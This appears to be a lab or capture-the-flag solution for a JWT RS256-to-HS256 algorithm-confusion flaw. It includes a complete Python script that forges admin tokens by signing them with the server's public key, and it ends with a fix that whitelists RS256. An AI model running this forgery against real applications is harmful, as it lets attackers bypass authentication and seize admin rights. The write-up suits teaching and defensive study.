# Solution: Algorithm Confusion — JWT RS256 to HS256

## Vulnerability

The `/admin` endpoint reads the `alg` field from the JWT header and uses it to decide how to verify the token. When `alg=HS256`, it uses the RSA **public key** as the HMAC secret. Since the public key is freely available at `/pubkey`, an attacker can forge admin tokens.

## Attack Steps

1. Fetch the RSA public key from `/pubkey`
2. Craft a JWT with `alg=HS256` and `role=admin`
3. Sign it with the public key bytes as the HMAC-SHA256 secret
4. Send forged token to `/admin`

## Full Attack Script

```python
#!/usr/bin/env python3
"""
JWT Algorithm Confusion Attack: RS256 -> HS256
"""
import sys
import requests
import jwt
import json
import base64

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def forge_jwt_hs256(public_pem, payload):
    """Forge a JWT signed with HS256 using the RSA public key as secret"""
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
    payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')))
    signing_input = f"{header_b64}.{payload_b64}"

    import hmac, hashlib
    if isinstance(public_pem, str):
        public_pem = public_pem.encode()
    sig = hmac.new(public_pem, signing_input.encode(), hashlib.sha256).digest()
    sig_b64 = b64url_encode(sig)
    return f"{signing_input}.{sig_b64}"

def attack(host, port=9999):
    base_url = f"http://{host}:{port}"

    # Step 1: Get public key
    print("[*] Fetching RSA public key...")
    r = requests.get(f"{base_url}/pubkey")
    public_pem = r.text
    print(f"[+] Got public key:\n{public_pem[:60]}...")

    # Step 2: Forge JWT with admin role
    import time
    payload = {
        "sub": "attacker",
        "role": "admin",
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600
    }
    forged_token = forge_jwt_hs256(public_pem, payload)
    print(f"[+] Forged token: {forged_token[:60]}...")

    # Step 3: Access /admin
    print("[*] Accessing /admin with forged token...")
    r = requests.get(
        f"{base_url}/admin",
        headers={"Authorization": f"Bearer {forged_token}"}
    )
    print(f"[+] Response: {r.json()}")

    if 'flag' in r.json():
        print(f"\n[+] FLAG: {r.json()['flag']}")
    else:
        print("[-] No flag in response")

    # Alternative using PyJWT (works with older versions)
    print("\n[*] Alternative with PyJWT:")
    try:
        token2 = jwt.encode(payload, public_pem, algorithm='HS256')
        r2 = requests.get(
            f"{base_url}/admin",
            headers={"Authorization": f"Bearer {token2}"}
        )
        print(f"[+] PyJWT response: {r2.json()}")
    except Exception as e:
        print(f"Note: {e}")

if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '172.30.99.21'
    attack(host)
```

## Why This Works

- RSA verification uses the public key to **verify** a signature made with the private key
- HMAC-SHA256 uses a **shared secret** for both signing and verification
- The server uses the public key as the HMAC secret, but the attacker also has the public key
- Therefore the attacker can forge any payload with any claims

## Prevention

Always explicitly whitelist allowed algorithms and never derive the algorithm from the token header:
```python
# SECURE:
decoded = jwt.decode(token, PUBLIC_PEM, algorithms=['RS256'])  # only RS256 allowed
```
